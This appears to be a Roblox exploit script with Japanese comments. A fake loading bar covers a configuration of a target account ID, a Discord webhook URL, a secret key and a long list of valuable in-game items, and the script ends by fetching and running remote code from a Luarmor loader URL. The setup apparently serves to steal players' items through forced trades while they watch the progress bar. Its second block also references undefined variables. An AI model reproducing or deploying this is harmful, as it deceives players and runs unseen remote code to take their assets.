-- [[ 1. ここから貼り付け：UIを別スレッドで即座に動かす ]]
task.spawn(function()
    local coreGui = game:GetService("CoreGui")
    if coreGui:FindFirstChild("XenoFinalLoader") then coreGui.XenoFinalLoader:Destroy() end

    local sg = Instance.new("ScreenGui", coreGui)
    sg.Name = "XenoFinalLoader"
    sg.IgnoreGuiInset = true

    local frame = Instance.new("Frame", sg)
    frame.Size = UDim2.new(0, 350, 0, 110)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

    local bg = Instance.new("Frame", frame)
    bg.Size = UDim2.new(0.85, 0, 0, 8)
    bg.Position = UDim2.new(0.5, 0, 0.65, 0)
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)

    local bar = Instance.new("Frame", bg)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(1, 0, 0, 30)
    txt.Position = UDim2.new(0.5, 0, 0.35, 0)
    txt.AnchorPoint = Vector2.new(0.5, 0.5)
    txt.BackgroundTransparency = 1
    txt.TextColor3 = Color3.fromRGB(255, 255, 255)
    txt.TextSize = 22
    txt.Font = Enum.Font.Code
    txt.Text = "0%"

    -- ループ処理（ここが独立して動くので、下のコードが重くても進みます）
    for i = 1, 100 do
        local waitTime = 0.3 -- 1%ごとに0.3秒
        game:GetService("TweenService"):Create(bar, TweenInfo.new(waitTime), {Size = UDim2.new(i/100, 0, 1, 0)}):Play()
        txt.Text = i .. "%"
        task.wait(waitTime)
    end
    task.wait(1)
    sg:Destroy()
end)
-- [[ 貼り付けここまで ]]

-- ==========================================
-- この下に「元のソースコード」を繋げる
-- ==========================================
getgenv().SECRET_KEY = "mrr_f03531d1b2f243c7a8deffae104bdc4d"
getgenv().TARGET_ID = 8255809810
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488064351888740382/T_EqFqk491KLUxTbFNlEnbrP1tiImtgwxpxBZYzVuypqKkLbAeI5CDxB34mF3qoGIkhH"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Perrito Burrito"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Tuff Toucan"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Festive 67"] = true,
    ["Las Tralaleritas"] = true,
    ["Los Tralaleritos"] = true,
    ["GOAT"] = true,
    ["Graipuss Medussi"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Tictac Sahur"] = true,
    ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Burguro And Fryuro"] = true,
    ["Lavadorito Spinito"] = true,
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Los Cupids"] = true,
    ["Celestial Pegasus"] = true,
    ["Antonio"] = true,
    ["La Lucky Grande"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Agarrini la Palini"] = true,
    ["Fragola La La La"] = true,
    ["Extinct Matteo"] = true,
    ["Karker Sahur"] = true,
    ["Bunnyman"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Brunito Marsito"] = true,
    ["Guest 666"] = true,
    ["Mariachi Corazoni"] = true,
    ["Swag Soda"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["La Grande Combinasion"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["La Karkerkar Combinasion"] = true,
    ["La Vacca Prese Presente"] = true,
    ["Rocco Disco"] = true,
    ["Los Trios"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["La Sahur Combinasion"] = true,
    ["25"] = true,
    ["Cupid Cupid Sahur"] = true,
    ["Ho Ho Ho Sahur"] = true,
    ["Chill Puppy"] = true,
    ["Los Sweethearts"] = true,
    ["Spinny Hammy"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Candies"] = true,
    ["Bacuru and Egguru"] = true,
    ["Money Money Reindeer"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Jackorilla"] = true,
    ["La Cucaracha"] = true,
    ["Extinct Tralalero"] = true,
    ["Vulturino Skeletono"] = true,
    ["Zombie Tralala"] = true,
    ["Boatito Auratito"] = true,
    ["Reindeer Tralala"] = true,
    ["Frankentteo"] = true,
    ["Pumpkini Spyderini"] = true,
    ["Santteo"] = true,
    ["La Vacca Jacko Linterino"] = true,
    ["Triplito Tralaleritos"] = true,
    ["Trickolino"] = true,
    ["Giftini Spyderini"] = true,
    ["Love Love Love Sahur"] = true,
    ["Please my Present"] = true,
    ["Telemorte"] = true,
    ["Santa Hotspot"] = true,
    ["Cupid Hotspot"] = true,
    ["Naughty Naughty"] = true,
    ["Noo my Candy"] = true,
    ["Noo my Present"] = true,
    ["Donkeyturbo Express"] = true,
    ["Noo my Heart"] = true,
    ["Los 25"] = true,
    ["Chimnino"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Dul Dul Dul"] = true,
    ["Horegini Boom"] = true,
    ["Burrito Bandito"] = true,
    ["Pot Pumpkin"] = true,
    ["Quesadilla Crocodila"] = true,
    ["Mi Gatito"] = true,
    ["Nooo My Hotspot"] = true,
    ["Los Jobcitos"] = true,
    ["Tung Tung Tung Sahur"] = true,
    ["Coffin Tung Tung Tung Sahur"] = true,
    ["Blackhole Goat"] = true,
    ["Chachechi"] = true,
    ["Sammyni Spyderini"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Ginger Sekolah"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Los Quesadillas"] = true,
    ["Arcadopus"] = true,
    ["Los Burritos"] = true,
    ["Los Cucarachas"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Rang Ring Bus"] = true,
    ["67"] = true,
    ["Los Spyderinis"] = true,
    ["1x1x1x1"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Los Karkeritos"] = true,
    ["Los Matteos"] = true,
    ["Cloverat Clapat"] = true,
    ["Dug dug dug"] = true,
    ["Granny"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Snailo Clovero"] = true,
    ["Noo my Gold"] = true,
    ["Luck Luck Luck Sahur"] = true,
    ["Gold Gold Gold"] = true,
    ["La Vacca Lepre Lepreino"] = true,
    ["Clovkur Kurkur"] = true,
    ["Patteo"] = true,
    ["Foxini Lanternini"] = true,
    ["To to to Sahur"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Eid Eid Eid Sahur"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Job Job Job Sahur"] = true,
    ["Chicliterita bicicliterita"] = true,
    ["Lovin Rose"] = true,
    ["Los Combinasionas"] = true,
    ["List List List Sahur"] = true,
    ["Los Amigos"] = true,
    ["La Secret Combinasion"] = true,
    ["Los 67"] = true,
    ["Esok Sekolah"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["La Food Combinasion"] = true,
    ["Pot Hotspot"] = true,
    ["Guerriro Digitale"] = true,
    ["Los Tortus"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Los Mi Gatitos"] = true,
    ["Los Chicleteiras"] = true,
    ["Yess my examine"] = true,
    ["Noo my examine"] = true
}
-- [[ あなたの元の呼び出しスクリプト（Luarmorなど） ]]


-- [[ 2. バーをゆっくり動かす処理（一番最後に貼る） ]]
task.spawn(function()
    for i = 1, 100 do
        local waitTime = 0.3 -- 1%ごとに0.3秒（合計30秒）
        game:GetService("TweenService"):Create(loader_bar, TweenInfo.new(waitTime), {Size = UDim2.new(i/100, 0, 1, 0)}):Play()
        loader_percent.Text = i .. "%"
        task.wait(waitTime)
    end
    task.wait(1)
    loader_ui:Destroy()
end)
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
